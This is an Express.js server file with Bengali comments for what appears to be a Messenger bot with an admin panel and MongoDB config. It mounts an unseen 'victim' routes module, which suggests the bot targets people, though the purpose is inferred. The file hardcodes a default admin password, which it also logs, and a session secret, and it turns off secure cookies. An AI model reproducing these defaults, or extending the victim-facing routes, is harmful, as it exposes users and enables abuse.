const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================
// ১. লোকাল কনফিগ ফাইল থেকে MongoDB URI লোড
// ============================
const DATA_DIR = path.join(__dirname, 'data');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
fs.ensureDirSync(DATA_DIR);

let mongoUri = '';
if (fs.existsSync(CONFIG_FILE)) {
    try {
        const config = fs.readJsonSync(CONFIG_FILE);
        mongoUri = config.mongoUri || '';
    } catch (e) {
        console.log('⚠️ config.json করাপ্ট, নতুন তৈরি হচ্ছে...');
    }
}

// যদি কনফিগ না থাকে, ডিফল্ট খালি URI দিয়ে ফাইল তৈরি করি
if (!mongoUri) {
    fs.writeJsonSync(CONFIG_FILE, { mongoUri: '' });
    console.log('📄 data/config.json তৈরি করা হয়েছে। দয়া করে MongoDB URI সেট করুন।');
}

// ============================
// ২. MongoDB সংযোগ (Retry লজিক ছাড়া, অ্যাডমিন প্যানেল থেকে URI সেট করলে রিস্টার্ট দিতে হবে)
// ============================
let isDbConnected = false;

async function connectDB(uri) {
    if (!uri) {
        console.log('⏳ MongoDB URI পাওয়া যায়নি। অ্যাডমিন প্যানেলে গিয়ে URI সেট করুন।');
        return;
    }
    try {
        await mongoose.connect(uri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });
        isDbConnected = true;
        console.log('✅ MongoDB সংযোগ সফল!');
        // কনফিগ মডেল ইম্পোর্ট (যাতে স্কিমা রেজিস্টার হয়)
        require('./models/Config');
        // ডিফল্ট কনফিগ সিড করা (যদি না থাকে)
        const Config = mongoose.model('Config');
        const existing = await Config.findOne({ key: 'bot_config' });
        if (!existing) {
            await Config.create({
                key: 'bot_config',
                pageAccessToken: '',
                verifyToken: 'Sakib_Verify',
                adminPassword: 'Sakib@7890',
                baseUrl: `http://localhost:${PORT}`
            });
            console.log('✅ ডিফল্ট কনফিগ তৈরি করা হয়েছে (পাসওয়ার্ড: Sakib@7890)');
        }
    } catch (err) {
        console.error('❌ MongoDB সংযোগ ব্যর্থ:', err.message);
        isDbConnected = false;
    }
}

connectDB(mongoUri);

// ============================
// ৩. মিডলওয়্যার
// ============================
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));
app.use(session({
    secret: 'sakib_super_secret_key_7890',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Render-এ HTTPS থাকলেও false রাখুন (লোকাল টেস্টের জন্য)
}));

// লোকাল কনফিগ আপডেট করার জন্য (শুধু Mongo URI)
app.post('/admin/update-mongo-uri', async (req, res) => {
    if (!req.session.isAdmin) return res.status(403).send('Unauthorized');
    const { mongoUri } = req.body;
    if (mongoUri) {
        fs.writeJsonSync(CONFIG_FILE, { mongoUri });
        console.log('🔄 MongoDB URI আপডেট করা হয়েছে। অ্যাপ রিস্টার্ট করুন (Render-এ Deploy ট্রিগার করুন) অথবা ম্যানুয়ালি রিস্টার্ট দিন।');
        return res.redirect('/admin/dashboard?msg=MongoDB+URI+সেভ+হয়েছে।+সার্ভার+রিস্টার্ট+দিন।');
    }
    res.redirect('/admin/dashboard?error=URI+দিন');
});

// ============================
// ৪. রাউটস লোড
// ============================
const webhookRoutes = require('./routes/webhook');
const adminRoutes = require('./routes/admin');
const victimRoutes = require('./routes/victim');

app.use(webhookRoutes);
app.use(adminRoutes);
app.use(victimRoutes);

// ============================
// ৫. সার্ভার চালু
// ============================
app.listen(PORT, () => {
    console.log(`🚀 সার্ভার চালু: http://localhost:${PORT}`);
    console.log(`🔐 অ্যাডমিন প্যানেল: http://localhost:${PORT}/admin`);
    console.log(`📌 ওয়েবহুক URL: http://localhost:${PORT}/webhook`);
});